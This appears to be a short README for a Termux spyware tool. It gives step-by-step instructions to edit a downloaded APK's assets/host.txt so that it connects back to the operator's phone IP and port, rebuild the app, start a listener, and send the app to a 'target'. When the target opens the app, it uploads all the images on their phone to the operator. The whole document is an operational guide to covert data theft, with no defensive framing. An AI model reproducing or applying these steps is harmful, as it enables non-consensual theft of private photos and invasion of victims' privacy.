How to run the tool after installing it on Termux: -

Click on the link to download the apk application that you will send to the target

After downloading the application, you must have an application editor, such as ApkEditor.

If you don't have the editor, you can download it from my channel on Telegram

Or you can download it from the internet if you don't have Telegram
*
After downloading the ApkEditor editor
1- Open it
2- Then choose the first option
3- Then choose the application you downloaded *
You will find it in the downloads folder, choose the application
4- Then choose the first option, then choose the first option again
5- Then click on Files at the bottom, then enter the assets folder
You will find a text file named host.txt
Enter it
Then you will find this host in it
```
tcp: //localhost:8080
```

You have to change localhost to your phone's IP
And change the port 8080 if you want to change it or leave it as it is
Then click on the save icon at the bottom of the application
Then go back and click on build at the top. After the application is built, you can send the application to anyone.

But before sending the application to anyone, first open the tool
It will ask you for IP and Port
Enter your phone's IP that you entered in the application
And enter the port you entered in the application
Then the tool will be activated and then send the application to anyone
And when they open it, you will receive all the images on their phone #
